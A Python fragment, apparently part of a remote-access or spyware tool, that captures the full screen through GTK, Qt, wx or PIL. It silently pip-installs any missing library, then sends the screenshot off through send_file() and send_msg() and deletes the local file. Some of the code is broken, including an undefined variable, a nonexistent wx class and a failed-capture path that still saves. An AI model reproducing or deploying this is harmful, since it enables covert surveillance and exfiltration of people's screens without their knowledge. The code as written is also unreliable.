
try:
    import Image
except:
    try:
        os.system("pip install PIL")
        import Image
    except:
        print("ahh im dying")


def tryScreenGrab():
    #try the following:
    #gtk
    #qt
    #wx
    #PIL

    try:
        import gtk
    except:
            try:
                os.system("pip install gtk")
                import gtk
            except:
                pass
            else:
                return gtkScreenGrab()
    else:
        return gtkScreenGrab()

    try:
        import PyQt4
    except:
        try:
            os.system("pip install PyQt4")
            import PyQt4
        except:
            pass
        else:
            return qtScreenGrab()
    else:
        return qtScreenGrab()

    try:
        import wx
    except:
        try:
            os.system("pip install wx")
            import wx
        except:
            pass
        else:
            return wxScreenGrab()
    else:
        return wxScreenGrab()

    try:
        import ImageGrab
    except:
        try:
            os.system("pip install ImageGrab")
            import ImageGrab
        except:
            pass
        else:
            return pilScreenGrab()
    else:
        return pilScreenGrab()
    return None

def gtkScreenGrab():
    import gtk
    import gtk.gdk
    w = gtk.gdk.get_default_root_window()
    sz = w.get_size()
    pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB, False, 8, sz[0], sz[1])
    pb = pb.get_from_drawable(w, w.get_colormap(), 0, 0, 0, 0, sz[0], sz[1])
    if pb is None:
        return False
    else:
        width, height = pb.get_width(), pb.get_height()
        return Image.fromstring("RGB", (width, height), pb.get_pixels() )

def qtScreenGrab():
    import PyQt4
    from PyQt4.QtGui import QPixmap, QApplication
    from PyQt4.Qt import QBuffer, QIODevice
    import StringIO
    app = QApplication(sys.argv)
    buffer = QBuffer()
    buffer.open(QIODevice.ReadWrite)
    QPixmap.grabWindow(QApplication.desktop().winId()).save(buffer, 'png')
    strio = StringIO.StringIO()
    strio.write(buffer.data())
    buffer.close()
    del app
    strio.seek(0)
    return Image.open(strio)

def wxScreenGrab():
    import wx
    wx.App()
    screen = wx.ScreenDC()
    size = screen.GetSize()
    bmp = wx.EmptyBitmap(size[0], size[1])
    mem = wx.MemoryDump(bmp)
    mem.Blit(0, 0, size[0], size[1], screen, 0, 0)
    del mem
    myWxImage = wx.ImageFromBitmap(myBitmap)
    PilImage = Image.new('RGB', (myWxImage.GetWidth(), myWxImage.GetHeight()) )
    PilImage.fromstring(myWxImage.GetData() )
    return PilImage

def pilScreenGrab():
    import ImageGrab
    img = ImageGrab.grab()
    return img


def screenGrab():
    img = tryScreenGrab()
    if img is None:
        send_msg("screenGrab", "uhhh crap it didn't work")
    filename = str(int(time.time())) + ".png"
    img.save(filename)
    send_file(filename)
    os.remove(filename)
    send_msg("screenGrab", "Sent image " + filename)

